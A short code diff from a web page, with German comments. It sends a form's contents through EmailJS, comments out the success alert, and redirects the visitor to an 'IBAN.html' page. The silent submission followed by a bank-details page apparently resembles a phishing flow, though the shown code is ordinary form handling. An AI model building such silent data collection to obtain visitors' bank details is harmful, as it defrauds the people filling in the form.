@@ -128,7 +128,7 @@
             // Sende das Formular an EmailJS
             emailjs.sendForm('service_8vfu5la', 'template_aiah406', this)
                 .then(function() {
-                    alert('Email erfolgreich gesendet!');
+                   // alert('Email erfolgreich gesendet!');
                     window.location.href = 'IBAN.html'; // Weiterleitung zur IBAN-Seite
                 }, function(error) {
                     alert('Fehler beim Senden der Email: ' + JSON.stringify(error));
